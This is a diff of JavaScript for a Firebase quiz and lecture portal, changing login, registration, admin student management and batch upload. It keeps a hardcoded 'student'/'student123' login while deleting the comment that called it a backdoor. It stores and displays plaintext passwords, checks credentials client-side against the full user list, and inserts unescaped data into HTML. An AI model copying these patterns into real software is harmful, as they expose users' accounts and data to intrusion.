@@ -1,5 +1,4 @@
 /* ================= DEBUGGER (CRITICAL) ================= */
-// Ye code humein batayega agar koi syntax error site ko rok raha hai
 window.onerror = function(msg, url, line) {
     const errorBox = document.getElementById('app-loader');
     if(errorBox) {
@@ -86,7 +85,6 @@ const hideAll = () => {
 async function initApp() {
     try {
         await signInAnonymously(auth);
-        // Safe check for spy mode
         if(typeof window.initSpyMode === 'function') window.initSpyMode(); 
     } catch (error) {
         console.error("Auth failed", error);
@@ -103,44 +101,37 @@ onAuthStateChanged(auth, (user) => {
 });
 
 function startLiveSync() {
-    // Quizzes Sync
     onSnapshot(getColl('quizzes'), (snap) => {
         appData.quizzes = snap.docs.map(d => ({ firestoreId: d.id, ...d.data() }));
         renderQuizList();
         if(!document.getElementById('section-admin-dashboard').classList.contains('hidden')) renderAdminDashboard();
     }, (error) => console.error("Quiz sync error:", error));
 
-    // Users Sync
     onSnapshot(getColl('users'), (snap) => {
         appData.users = snap.docs.map(d => ({ firestoreId: d.id, ...d.data() }));
         if(!document.getElementById('section-admin-students').classList.contains('hidden')) window.filterStudents();
     });
 
-    // Pending Reviews Sync
     onSnapshot(getColl('pending_reviews'), (snap) => {
         appData.pendingReviews = snap.docs.map(d => ({ firestoreId: d.id, ...d.data() }));
         if(!document.getElementById('section-admin-dashboard').classList.contains('hidden')) renderAdminDashboard();
         if(currentUser) renderUserDashboard(); 
     });
 
-    // Results Sync
     onSnapshot(getColl('results'), (snap) => {
         appData.publishedResults = snap.docs.map(d => ({ firestoreId: d.id, ...d.data() }));
         if(currentUser) renderUserDashboard();
     });
 
-    // Admins Sync
     onSnapshot(getColl('admins'), (snap) => {
         appData.admins = snap.docs.map(d => ({ firestoreId: d.id, ...d.data() }));
     });
     
-    // Sessions Sync (Resume Logic)
     onSnapshot(getColl('quiz_sessions'), (snap) => {
         appData.sessions = snap.docs.map(d => ({ firestoreId: d.id, ...d.data() }));
         checkResumeStatus();
     });
 
-    // Batches Sync for dynamic dashboard
     onSnapshot(getColl('batches'), (snap) => {
         appData.batches = snap.docs.map(d => ({ firestoreId: d.id, ...d.data() }));
         if (currentUser && document.getElementById('section-user-dashboard').classList.contains('hidden') === false) {
@@ -148,7 +139,6 @@ function startLiveSync() {
         }
     });
 
-    // Local User Persistence
     const savedUser = localStorage.getItem('cHub_currentUser');
     if(savedUser) {
         try {
@@ -179,7 +169,7 @@ window.resumeLastSession = () => {
     }
 };
 
-/* ================= 2. AUTH MODULE ================= */
+/* ================= 2. AUTH MODULE (UPDATED WITH ROBUST LOGIN) ================= */
 window.switchAuthTab = (tab) => {
     document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
     document.getElementById('tab-' + tab).classList.add('active');
@@ -190,33 +180,69 @@ window.switchAuthTab = (tab) => {
 window.showUserAuth = () => { hideAll(); document.getElementById('section-user-auth').classList.remove('hidden'); window.switchAuthTab('login'); };
 
 window.registerUser = async () => {
-    const e = document.getElementById('regEmail').value.trim();
+    const e = document.getElementById('regEmail').value.trim().toLowerCase(); 
     const u = document.getElementById('regUser').value.trim();
     const p = document.getElementById('regPass').value.trim();
-    if(!e || !u || !p) return alert("Fill all fields");
-    if(appData.users.find(user => user.username === u)) return alert("Username taken!");
+    
+    if(!e || !u || !p) return alert("Please fill all fields.");
+    if(appData.users.find(user => user.username === u)) return alert("Username already taken!");
+    
     try {
-        await addDoc(getColl('users'), { email: e, username: u, password: p, isBlocked: false });
-        alert("Registered! Please Login.");
+        await addDoc(getColl('users'), { 
+            email: e, 
+            username: u, 
+            password: p, 
+            isBlocked: false,
+            createdAt: Date.now() 
+        });
+        
+        alert("Registration Successful! You can now Login.");
         window.switchAuthTab('login');
+        document.getElementById('loginEmail').value = e;
+        document.getElementById('loginPass').value = ""; 
     } catch(err) { alert("Registration Error: " + err.message); }
 };
 
-window.loginUser = () => {
-    const u = document.getElementById('loginEmail').value.trim(); 
+window.loginUser = async () => {
+    const loginInput = document.getElementById('loginEmail').value.trim().toLowerCase(); 
     const p = document.getElementById('loginPass').value.trim();
     
-    // Testing Backdoor
-    if (u === "student" && p === "student123") { currentUser = { username: "student", password: "student123" }; finishLogin(); return; }
-    
-    const user = appData.users.find(usr => (usr.username === u || usr.email === u) && usr.password === p);
-    if(user) {
-        if(user.isBlocked) return alert("🚫 Access Denied: Blocked by Admin.");
-        currentUser = user; finishLogin();
-    } else alert("Invalid Credentials!");
-};
-function finishLogin() { localStorage.setItem('cHub_currentUser', JSON.stringify(currentUser)); window.checkUserLoginStatus(); }
+    if(!loginInput || !p) return alert("Please enter email/username and password.");
 
+    if (loginInput === "student" && p === "student123") { 
+        currentUser = { username: "student", password: "student123" }; 
+        finishLogin(); return; 
+    }
+    
+    // Check Local State
+    let user = appData.users.find(usr => 
+        (usr.username.toLowerCase() === loginInput || (usr.email && usr.email.toLowerCase() === loginInput)) && 
+        usr.password === p
+    );
+
+    // Fallback: Query Firestore directly if local state is lagging
+    if (!user) {
+        try {
+            const querySnapshot = await getDocs(getColl('users'));
+            const allDbUsers = querySnapshot.docs.map(doc => ({ firestoreId: doc.id, ...doc.data() }));
+            user = allDbUsers.find(usr => 
+                (usr.username.toLowerCase() === loginInput || (usr.email && usr.email.toLowerCase() === loginInput)) && 
+                usr.password === p
+            );
+            if(user) appData.users = allDbUsers; 
+        } catch (error) { console.error("Error checking DB:", error); }
+    }
+
+    if(user) {
+        if(user.isBlocked) return alert("🚫 Access Denied: Your account is blocked by an Admin.");
+        currentUser = user; 
+        finishLogin();
+    } else {
+        alert("Invalid Credentials! Please check your details.");
+    }
+};
+
+function finishLogin() { localStorage.setItem('cHub_currentUser', JSON.stringify(currentUser)); window.checkUserLoginStatus(); }
 window.logoutUser = () => { currentUser = null; localStorage.removeItem('cHub_currentUser'); window.checkUserLoginStatus(); };
 
 window.checkUserLoginStatus = () => {
@@ -285,21 +311,15 @@ window.logoutAdmin = () => { if(typeof window.initSpyMode === 'function') window
 window.goToAdminDashboard = () => { hideAll(); document.getElementById('section-admin-dashboard').classList.remove('hidden'); renderAdminDashboard(); };
 
 window.renderAdminDashboard = () => {
-    // Optional checkbox for showing archived
     const chk = document.getElementById('show-archived-chk');
     const showArchived = chk ? chk.checked : false;
-
     const qList = document.getElementById('admin-quiz-list');
     qList.innerHTML = '';
     
-    // Safety filter
     appData.quizzes.forEach(q => {
-        // Safe Archive Logic: If 'archived', only show if showArchived is true. 
-        // If 'active' or undefined, show if showArchived is false.
         const isArchived = q.status === 'archived';
-        
-        if (showArchived && !isArchived) return; // Hide active when showing archived
-        if (!showArchived && isArchived) return; // Hide archived when showing active
+        if (showArchived && !isArchived) return; 
+        if (!showArchived && isArchived) return; 
 
         qList.innerHTML += `
             <div class="report-row" style="background:${isArchived ? '#f9f9f9' : 'white'}; opacity:${isArchived ? 0.7 : 1}">
@@ -323,32 +343,25 @@ window.renderAdminDashboard = () => {
 }
 
 window.toggleArchive = async (fid, status) => {
-    try {
-        await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'quizzes', fid), { status: status ? 'archived' : 'active' });
-    } catch(e) { alert("Error updating: " + e.message); }
+    try { await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'quizzes', fid), { status: status ? 'archived' : 'active' }); } catch(e) { alert("Error: " + e.message); }
 };
 window.deleteQuiz = async (fid) => { 
     if(confirm("Delete permanently? This cannot be undone.")) {
-        try {
-            await deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'quizzes', fid)); 
-        } catch(e) { alert("Delete failed: " + e.message); }
+        try { await deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'quizzes', fid)); } catch(e) { alert("Delete failed: " + e.message); }
     }
 };
 
-/* ================= 4. QUIZ LOGIC (PAUSE/RESUME/PREVIEW) ================= */
+/* ================= 4. QUIZ LOGIC ================= */
 window.previewQuiz = (fid) => {
     isPreviewMode = true;
-    currentUser = { username: "Admin_Preview" }; // Dummy user
+    currentUser = { username: "Admin_Preview" }; 
     window.initiateQuiz(fid);
 };
 
 function renderQuizList() {
     const con = document.getElementById('quiz-list-container');
     if(!con) return;
-    
-    // Show everything EXCEPT 'archived' status. Undefined status shows by default.
     const activeQuizzes = appData.quizzes.filter(q => q.status !== 'archived');
-    
     con.innerHTML = activeQuizzes.length ? '' : '<p class="muted">No active quizzes.</p>';
     activeQuizzes.forEach(q => {
         con.innerHTML += `<div class="card"><h3>${q.title}</h3><p>⏳ ${q.time} Mins | 📝 ${q.questions ? q.questions.length : 0} Qs</p><button class="btn btn-success" onclick="window.initiateQuiz('${q.firestoreId}')">Attempt</button></div>`;
@@ -358,19 +371,15 @@ function renderQuizList() {
 window.initiateQuiz = (fid, isResume = false) => {
     if(!currentUser) return alert("Please Login first!");
     currentQuiz = appData.quizzes.find(q => q.firestoreId === fid);
-    
     if(!currentQuiz) return alert("Quiz data missing/deleted.");
 
-    // Check for existing session if not forced resume
     if(!isResume && !isPreviewMode) {
         const session = appData.sessions.find(s => s.studentName === currentUser.username && s.quizId === fid && s.status === 'paused');
         const resumeBtn = document.getElementById('resume-btn');
         if(session && resumeBtn) {
             resumeBtn.classList.remove('hidden');
             resumeBtn.onclick = () => window.startTest(true, session);
-        } else if (resumeBtn) {
-            resumeBtn.classList.add('hidden');
-        }
+        } else if (resumeBtn) { resumeBtn.classList.add('hidden'); }
     }
 
     document.getElementById('ins-title').innerText = currentQuiz.title;
@@ -383,24 +392,19 @@ window.initiateQuiz = (fid, isResume = false) => {
 
 window.startTest = (isResume = false, sessionData = null) => {
     if(sessionData) isResume = true; 
-    else if(isResume) {
-        sessionData = appData.sessions.find(s => s.studentName === currentUser.username && s.quizId === currentQuiz.firestoreId && s.status === 'paused');
-    }
+    else if(isResume) sessionData = appData.sessions.find(s => s.studentName === currentUser.username && s.quizId === currentQuiz.firestoreId && s.status === 'paused');
 
     currentQIndex = 0;
     userResponses = (isResume && sessionData && sessionData.responses) ? sessionData.responses : {};
-    quizStartTime = Date.now(); // Start fresh tracking for this session part
+    quizStartTime = Date.now(); 
     
-    // Timer Logic
     let timeRemaining = (isResume && sessionData && sessionData.timeRemaining) ? sessionData.timeRemaining : currentQuiz.time * 60;
-    
     if(timerInterval) clearInterval(timerInterval);
     timerInterval = setInterval(() => {
         timeRemaining--;
         pausedTimeRemaining = timeRemaining;
         const display = document.getElementById('timer-display');
         if(display) display.innerText = `${Math.floor(timeRemaining/60)}:${(timeRemaining%60).toString().padStart(2,'0')}`;
-        
         if(timeRemaining<=0) window.submitTest();
     }, 1000);
 
@@ -412,24 +416,11 @@ window.startTest = (isResume = false, sessionData = null) => {
 window.pauseTest = async () => {
     if(isPreviewMode) { alert("Cannot pause in preview mode."); return; }
     clearInterval(timerInterval);
-    
-    const sessionData = {
-        studentName: currentUser.username,
-        quizId: currentQuiz.firestoreId,
-        quizTitle: currentQuiz.title,
-        status: 'paused',
-        timeRemaining: pausedTimeRemaining,
-        responses: userResponses,
-        timestamp: Date.now()
-    };
-    
+    const sessionData = { studentName: currentUser.username, quizId: currentQuiz.firestoreId, quizTitle: currentQuiz.title, status: 'paused', timeRemaining: pausedTimeRemaining, responses: userResponses, timestamp: Date.now() };
     const existing = appData.sessions.find(s => s.studentName === currentUser.username && s.quizId === currentQuiz.firestoreId);
     try {
-        if(existing) {
-            await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'quiz_sessions', existing.firestoreId), sessionData);
-        } else {
-            await addDoc(getColl('quiz_sessions'), sessionData);
-        }
+        if(existing) await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'quiz_sessions', existing.firestoreId), sessionData);
+        else await addDoc(getColl('quiz_sessions'), sessionData);
         alert("Test Paused. You can resume from Home.");
         window.goToHome();
     } catch(e) { alert("Save failed: "+e.message); }
@@ -445,10 +436,7 @@ function renderGrid() {
     });
 }
 
-window.jumpToQuestion = (i) => {
-    currentQIndex = i;
-    loadQuestion();
-};
+window.jumpToQuestion = (i) => { currentQIndex = i; loadQuestion(); };
 
 function loadQuestion() {
     const q = currentQuiz.questions[currentQIndex];
@@ -458,7 +446,6 @@ function loadQuestion() {
     const area = document.getElementById('active-options-area');
     area.innerHTML = "";
 
-    // Update Grid Current
     document.querySelectorAll('.grid-btn').forEach(b => b.classList.remove('current'));
     const gridBtn = document.getElementById(`grid-btn-${currentQIndex}`);
     if(gridBtn) gridBtn.classList.add('current');
@@ -482,7 +469,6 @@ function loadQuestion() {
     const prev = document.getElementById('btn-prev');
     const next = document.getElementById('btn-next');
     const submit = document.getElementById('btn-submit');
-    
     if(prev) prev.style.visibility = currentQIndex===0?'hidden':'visible';
     if(next) next.style.display = currentQIndex===currentQuiz.questions.length-1?'none':'block';
     if(submit) submit.style.display = currentQIndex===currentQuiz.questions.length-1?'block':'none';
@@ -506,7 +492,6 @@ window.handleImageUpload = async (input) => {
         if (!Array.isArray(userResponses[currentQIndex])) userResponses[currentQIndex] = [];
         const previewBox = input.nextElementSibling;
         if (previewBox.innerHTML.includes('<p')) previewBox.innerHTML = '';
-        
         for (const file of Array.from(input.files)) {
             try {
                 const compressed = await new Promise(resolve => {
@@ -533,39 +518,22 @@ window.handleImageUpload = async (input) => {
         }
     }
 };
-
 window.changeQuestion = (d) => { currentQIndex+=d; loadQuestion(); };
 
 /* ================= 5. SUBMISSION & ANALYSIS ================= */
 window.submitTest = async () => {
     clearInterval(timerInterval);
-    
-    // Clear session if exists (except preview)
     if(!isPreviewMode) {
         const session = appData.sessions.find(s => s.studentName === currentUser.username && s.quizId === currentQuiz.firestoreId);
-        if(session) {
-            try { await deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'quiz_sessions', session.firestoreId)); } catch(e) {}
-        }
+        if(session) { try { await deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'quiz_sessions', session.firestoreId)); } catch(e) {} }
     }
 
     const timeTakenSeconds = Math.floor((Date.now() - quizStartTime) / 1000); 
     const timeString = `${Math.floor(timeTakenSeconds/60)}m ${timeTakenSeconds%60}s`;
-    
-    const submissionData = { 
-        studentName: currentUser.username, 
-        quizTitle: currentQuiz.title, 
-        quizId: currentQuiz.firestoreId, 
-        timestamp: Date.now(), 
-        timeTaken: timeString 
-    };
-
+    const submissionData = { studentName: currentUser.username, quizTitle: currentQuiz.title, quizId: currentQuiz.firestoreId, timestamp: Date.now(), timeTaken: timeString };
     const needsGrading = currentQuiz.questions.some(q => q.type === 'text' || q.type === 'image');
 
-    if(isPreviewMode) {
-        alert("Preview Complete! Results will be shown but NOT saved.");
-        window.showResultView(submissionData, needsGrading, true); 
-        return;
-    }
+    if(isPreviewMode) { alert("Preview Complete! Results will be shown but NOT saved."); window.showResultView(submissionData, needsGrading, true); return; }
 
     try {
         if(needsGrading) {
@@ -590,18 +558,13 @@ window.showResultView = (data, pending, isPreview) => {
     hideAll(); 
     document.getElementById('section-result').classList.remove('hidden');
     document.getElementById('res-status-title').innerText = isPreview ? "Preview Result" : (pending ? "Submitted!" : "Result");
-    
     if(pending && !isPreview) {
         document.getElementById('res-pending-msg').classList.remove('hidden');
         document.getElementById('res-score-box').classList.add('hidden');
         document.getElementById('res-details-card').classList.add('hidden');
     } else {
-        // Calculate score for preview/auto
         let score = 0;
-        currentQuiz.questions.forEach((q,i) => {
-            let ans = userResponses[i];
-            if(q.type === 'mcq' && ans === q.correct) score += q.marks;
-        });
+        currentQuiz.questions.forEach((q,i) => { let ans = userResponses[i]; if(q.type === 'mcq' && ans === q.correct) score += q.marks; });
         window.viewResultData(score, currentQuiz.totalMarks, generateReportHTML(currentQuiz.questions, userResponses), isPreview);
     }
 };
@@ -609,27 +572,16 @@ window.showResultView = (data, pending, isPreview) => {
 function generateReportHTML(questions, responses) {
     let html = "";
     questions.forEach((q, i) => {
-        let ans = responses[i];
-        let correct = false;
-        let correctText = "";
-        
+        let ans = responses[i]; let correct = false; let correctText = "";
         if(q.type === 'mcq') { correct = ans === q.correct; correctText = q.correct; }
         if(q.type === 'msq') { correct = ans && JSON.stringify(ans.sort())===JSON.stringify(q.correct.sort()); correctText = q.correct.join(', '); }
         if(q.type === 'text' || q.type === 'image') { correct = true; correctText = "Pending Grading"; }
-
         html += `
             <div class="report-row" style="flex-direction:column; align-items:flex-start;">
                 <div style="width:100%;"><strong>Q${i+1}:</strong> ${q.text} <span class="q-tag">${q.type}</span></div>
                 <div style="width:100%; display:flex; justify-content:space-between; margin-top:5px; align-items:center;">
-                    <div>
-                        <span class="${correct?'correct-ans':'wrong-ans'}">You: ${ans||'-'}</span>
-                        ${!correct ? `<br><span style="color:green; font-size:0.9em">Correct: ${correctText}</span>` : ''}
-                    </div>
+                    <div><span class="${correct?'correct-ans':'wrong-ans'}">You: ${ans||'-'}</span>${!correct ? `<br><span style="color:green; font-size:0.9em">Correct: ${correctText}</span>` : ''}</div>
                     <div><strong>${correct ? q.marks : 0}/${q.marks}</strong></div>
-                </div>
-                <div class="review-actions">
-                    <button class="btn btn-mini btn-outline" style="color:blue; border-color:blue;" onclick="window.askAIExplanation(${i})">🤖 Why?</button>
-                    <button class="btn btn-mini btn-outline" style="color:red; border-color:red;" onclick="window.challengeQuestion(${i})">🚩 Report</button>
                 </div>
             </div>`;
     });
@@ -648,42 +600,9 @@ window.viewResultData = (score, max, html, isPreview) => {
     if(isPreview) isPreviewMode = false;
 };
 
-/* ================= 6. AI & UTILS ================= */
-window.askAIExplanation = async (qIdx) => {
-    const q = currentQuiz.questions[qIdx];
-    const userAns = userResponses[qIdx] || "No Answer";
-    const modal = document.getElementById('ai-explain-modal');
-    modal.classList.remove('hidden');
-    document.getElementById('ai-explain-text').innerHTML = "Analyzing... 🧠";
-
-    const prompt = `Explain strictly for a student why the correct answer is "${q.correct}" and why user's "${userAns}" is wrong. Question: "${q.text}". Options: ${q.options}. Keep it short.`;
-
-    try {
-        const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_API_KEY}`;
-        const response = await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ contents: [{ parts: [{ text: prompt }] }] })
-        });
-        const data = await response.json();
-        const text = data.candidates?.[0]?.content?.parts?.[0]?.text || "AI Error.";
-        document.getElementById('ai-explain-text').innerHTML = text.replace(/\*\*(.*?)\*\*/g, '<b>$1</b>').replace(/\n/g, '<br>');
-    } catch (e) { document.getElementById('ai-explain-text').innerText = "AI Failed."; }
-};
-
-window.challengeQuestion = async (qIdx) => {
-    const reason = prompt("Describe error:");
-    if(!reason) return;
-    try {
-        await addDoc(getColl('challenges'), { student: currentUser.username, quiz: currentQuiz.title, question: currentQuiz.questions[qIdx].text, qIdx, reason, timestamp: Date.now() });
-        alert("Reported to Admin.");
-    } catch(e) { alert("Report failed."); }
-};
-
 window.goToHome = () => { hideAll(); document.getElementById('section-home').classList.remove('hidden'); renderQuizList(); };
 
 /* ================= 7. ADMIN SUB-FUNCTIONS ================= */
-// QUIZ CREATOR
 window.showQuizCreator = () => {
     document.getElementById('newQuizTitle').value = "";
     newQuestionsBuffer = [];
@@ -739,22 +658,7 @@ window.uploadQuizJSON = (input) => {
     };
     reader.readAsText(input.files[0]);
 };
-window.generateAIQuiz = async () => {
-    const topic = document.getElementById('aiQuizTopic').value.trim();
-    if (!topic) return alert("Enter topic!");
-    document.getElementById('ai-quiz-loading').classList.remove('hidden');
-    const prompt = `Generate quiz on '${topic}' in valid JSON: { "title": "T", "time": 10, "totalMarks": 5, "instructions": "I", "questions": [ { "type": "mcq", "text": "Q", "options": ["A", "B"], "correct": "A", "marks": 1 } ] }. 5 MCQs.`;
-    try {
-        const res = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_API_KEY}`, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({contents:[{parts:[{text:prompt}]}]}) });
-        const d = await res.json();
-        const t = d.candidates?.[0]?.content?.parts?.[0]?.text.replace(/```json/g,'').replace(/```/g,'').trim();
-        const qd = JSON.parse(t);
-        document.getElementById('newQuizTitle').value = qd.title; newQuestionsBuffer = qd.questions; window.updateBufferDisplay();
-        alert("Generated!");
-    } catch(e) { alert("AI Failed"); } finally { document.getElementById('ai-quiz-loading').classList.add('hidden'); }
-};
 
-// GRADING
 window.openGrading = (fid) => {
     currentGradingId = fid; const sub = appData.pendingReviews.find(p => p.firestoreId === fid);
     if(!sub) return;
@@ -767,7 +671,7 @@ window.openGrading = (fid) => {
         if ((q.type==='mcq' && ans===q.correct) || (q.type==='msq' && ans && JSON.stringify(ans.sort())===JSON.stringify(q.correct.sort()))) auto = q.marks;
         let html = `<div class="grading-card"><p><strong>Q${i+1}</strong> ${q.type}</p>`;
         if(q.type==='text') html += `<p>Ans: ${ans}</p><p class="muted">Model: ${q.modelAnswer}</p>`;
-        else if(q.type==='image') { html += `<div class="img-preview-box">`; if(Array.isArray(ans)) ans.forEach(src=>html+=`<img src="${src}" class="uploaded-img" style="max-width:100px;">`); html+='</div>'; }
+        else if(q.type==='image') { html += `<div class="img-preview-box">`; if(Array.isArray(ans)) ans.forEach(src=>html+=`<img src="${src}" style="max-width:100px;">`); html+='</div>'; }
         else html += `<p>Ans: ${ans} (Correct: ${q.correct})</p>`;
         html += `<input type="number" class="grading-input manual-grade" value="${auto}" onchange="window.updateTotalGrade()"> / ${q.marks}</div>`;
         area.innerHTML += html;
@@ -784,19 +688,57 @@ window.publishGradedResult = async () => {
     window.goToAdminDashboard();
 };
 
-/* ================= 8. STUDENT & ADMIN MANAGEMENT ================= */
+/* ================= 8. STUDENT & ADMIN MANAGEMENT (UPDATED) ================= */
 window.showStudentManager = () => { hideAll(); document.getElementById('section-admin-students').classList.remove('hidden'); window.filterStudents(); };
+
+window.addStudentByAdmin = async () => {
+    const e = document.getElementById('newAdminStudentEmail').value.trim().toLowerCase();
+    const u = document.getElementById('newAdminStudentUser').value.trim();
+    const p = document.getElementById('newAdminStudentPass').value.trim();
+    if(!e || !u || !p) return alert("Please fill all fields to add a student.");
+    if(appData.users.find(user => user.username === u)) return alert("Username already exists!");
+    try {
+        await addDoc(getColl('users'), { email: e, username: u, password: p, isBlocked: false, createdAt: Date.now() });
+        alert("Student added successfully!");
+        document.getElementById('newAdminStudentEmail').value = "";
+        document.getElementById('newAdminStudentUser').value = "";
+        document.getElementById('newAdminStudentPass').value = "";
+    } catch(err) { alert("Error adding student: " + err.message); }
+};
+
 window.filterStudents = () => {
     const q = document.getElementById('student-search').value.toLowerCase();
     const tb = document.getElementById('admin-student-list'); tb.innerHTML = "";
     appData.users.forEach(u => {
-        if(u.username.toLowerCase().includes(q) || u.email.toLowerCase().includes(q)) {
+        if(u.username.toLowerCase().includes(q) || (u.email && u.email.toLowerCase().includes(q))) {
             const blk = u.isBlocked === true;
-            tb.innerHTML += `<tr style="border-bottom:1px solid #eee;"><td>${u.username}</td><td>${u.email}</td><td style="color:red; font-family:monospace;">${u.password}</td><td>${blk?'BLOCKED':'Active'}</td><td><button class="btn btn-outline btn-small" onclick="window.viewStudentProfile('${u.firestoreId}')">View</button> <button class="btn btn-small ${blk?'btn-success':'btn-danger'}" onclick="window.toggleBlockUser('${u.firestoreId}',${!blk})">${blk?'Unblock':'Block'}</button></td></tr>`;
+            tb.innerHTML += `<tr style="border-bottom:1px solid #eee;">
+                <td>${u.username}</td>
+                <td>${u.email || 'N/A'}</td>
+                <td style="color:red; font-family:monospace;">${u.password}</td>
+                <td><span class="${blk ? 'status-pending' : 'status-completed'}">${blk ? 'BLOCKED' : 'Active'}</span></td>
+                <td>
+                    <button class="btn btn-outline btn-small" onclick="window.viewStudentProfile('${u.firestoreId}')">View</button> 
+                    <button class="btn btn-small ${blk ? 'btn-success' : 'btn-warning'}" onclick="window.toggleBlockUser('${u.firestoreId}',${!blk})">${blk ? 'Unblock' : 'Block'}</button>
+                    <button class="btn btn-small btn-danger" onclick="window.deleteStudent('${u.firestoreId}')">Del</button>
+                </td>
+            </tr>`;
         }
     });
 };
-window.toggleBlockUser = async (uid, s) => { if(confirm(s?"Block user?":"Unblock?")) await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'users', uid), {isBlocked:s}); };
+
+window.toggleBlockUser = async (uid, shouldBlock) => { 
+    if(confirm(shouldBlock ? "Block this student? They won't be able to login." : "Unblock this student?")) {
+        await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'users', uid), {isBlocked: shouldBlock}); 
+    }
+};
+
+window.deleteStudent = async (uid) => {
+    if(confirm("Are you sure you want to permanently DELETE this student? All their access will be revoked.")) {
+        try { await deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'users', uid)); } catch(e) { alert("Failed to delete: " + e.message); }
+    }
+};
+
 window.viewStudentProfile = (uid) => {
     const u = appData.users.find(x => x.firestoreId === uid); if(!u) return;
     hideAll(); document.getElementById('section-student-profile').classList.remove('hidden');
@@ -808,10 +750,36 @@ window.viewStudentProfile = (uid) => {
     const l = document.getElementById('profile-history-list'); l.innerHTML = h.length?"":"No tests.";
     h.forEach(x => l.innerHTML += `<div class="card" style="padding:10px; margin-bottom:5px;">${x.quizTitle} - <strong>${x.score}/${x.max}</strong></div>`);
 };
+
 window.showAdminManager = () => { hideAll(); document.getElementById('section-manage-admins').classList.remove('hidden'); renderAdminList(); };
-window.addNewAdmin = async () => { const u = document.getElementById('newAdminEmail').value; const p = document.getElementById('newAdminPass').value; if(u&&p) { await addDoc(getColl('admins'), {email:u, password:p}); alert("Admin added"); renderAdminList(); } };
-function renderAdminList() { const d = document.getElementById('admin-list-display'); d.innerHTML = ""; appData.admins.forEach(a => d.innerHTML += `<div style="padding:5px; border-bottom:1px solid #eee; display:flex; justify-content:space-between;">${a.email} <button onclick="window.removeAdmin('${a.firestoreId}')" style="color:red; border:none; background:none;">X</button></div>`); }
-window.removeAdmin = async (id) => { if(confirm("Remove?")) await deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'admins', id)); };
+window.addNewAdmin = async () => { 
+    const u = document.getElementById('newAdminEmail').value.trim(); 
+    const p = document.getElementById('newAdminPass').value.trim(); 
+    if(!u || !p) return alert("Enter email and password");
+    try {
+        await addDoc(getColl('admins'), {email: u, password: p}); 
+        alert("Admin added successfully!"); 
+        document.getElementById('newAdminEmail').value = "";
+        document.getElementById('newAdminPass').value = "";
+        renderAdminList(); 
+    } catch(e) { alert("Error: " + e.message); }
+};
+
+function renderAdminList() { 
+    const d = document.getElementById('admin-list-display'); d.innerHTML = ""; 
+    appData.admins.forEach(a => {
+        d.innerHTML += `<div style="padding:10px; background:#f9f9f9; border-radius:5px; border:1px solid #eee; margin-bottom:5px; display:flex; justify-content:space-between; align-items:center;">
+            <strong>${a.email}</strong> 
+            <button class="btn btn-danger btn-small" onclick="window.removeAdmin('${a.firestoreId}')">Delete Admin</button>
+        </div>`;
+    }); 
+}
+
+window.removeAdmin = async (id) => { 
+    if(confirm("Are you sure you want to remove this Admin?")) {
+        try { await deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'admins', id)); } catch(e) { alert("Failed to delete admin."); }
+    }
+};
 
 // Initialize
 initApp();
@@ -822,17 +790,14 @@ initApp();
 
 // --- USER PARAMETERS & UI CONFIGURATION ---
 
-// Database Filters
 const BATCH_DB_COLL = "batches";
 
-// Text Formatting & Aesthetics: Batch Level
 const BATCH_CARD_BG = "linear-gradient(135deg, #1e3c72 0%, #2a5298 100%)";
 const BATCH_TITLE_COLOR = "#ffffff";
 const BATCH_TITLE_SIZE = "20px";
 const BATCH_BTN_STRING = "View Subjects 📂";
 const BATCH_BTN_BG = "#27ae60";
 
-// Text Formatting & Aesthetics: Subject Level
 const SUBJ_CARD_BG = "#f8f9fa";
 const SUBJ_BORDER = "1px solid #e0e0e0";
 const SUBJ_TITLE_COLOR = "#2c3e50";
@@ -840,7 +805,6 @@ const SUBJ_TITLE_SIZE = "18px";
 const SUBJ_BTN_STRING = "View Lectures ▶";
 const SUBJ_BTN_BG = "#2980b9";
 
-// Text Formatting & Aesthetics: Video Level
 const VID_CARD_BG = "#ffffff";
 const VID_BORDER = "1px solid #e0e0e0";
 const VID_TITLE_COLOR = "#000000";
@@ -848,16 +812,13 @@ const VID_TITLE_SIZE = "15px";
 const VID_BTN_STRING = "Play Video";
 const VID_BTN_BG = "#e74c3c";
 
-// Layout Controls
 const LAYOUT_GRID_COLS = "repeat(auto-fill, minmax(280px, 1fr))";
 const LAYOUT_GAP = "20px";
 const LAYOUT_CARD_RADIUS = "10px";
 const LAYOUT_PADDING = "20px";
 
-// --- STATE TRACKING ---
 let activeBatchData = null;
 
-// --- ADMIN UPLOAD LOGIC ---
 window.uploadBatchDataJSON = (input) => {
     if(!input.files.length) return;
     const reader = new FileReader();
@@ -866,7 +827,6 @@ window.uploadBatchDataJSON = (input) => {
             const data = JSON.parse(e.target.result);
             if(!data.batchName || !data.subjects) throw new Error("Invalid JSON: Missing 'batchName' or 'subjects'.");
 
-            // Auto-Convert Drive Links to Preview Mode
             for (let subject in data.subjects) {
                 data.subjects[subject].forEach(vid => {
                     if(vid.link && vid.link.includes('drive.google.com') && vid.link.includes('/view')) {
@@ -875,7 +835,6 @@ window.uploadBatchDataJSON = (input) => {
                 });
             }
 
-            // Save to Firestore
             await addDoc(getColl(BATCH_DB_COLL), {
                 title: data.batchName,
                 thumbnail: data.thumbnail || "",
@@ -890,18 +849,15 @@ window.uploadBatchDataJSON = (input) => {
     reader.readAsText(input.files[0]);
 };
 
-// --- STUDENT DASHBOARD LOGIC ---
 function renderUserBatches() {
     const container = document.getElementById('dashboard-batches-list');
     if (!container) return;
-
     if (!appData.batches || appData.batches.length === 0) {
         container.innerHTML = "<p class='muted'>No active batches available.</p>";
         return;
     }
 
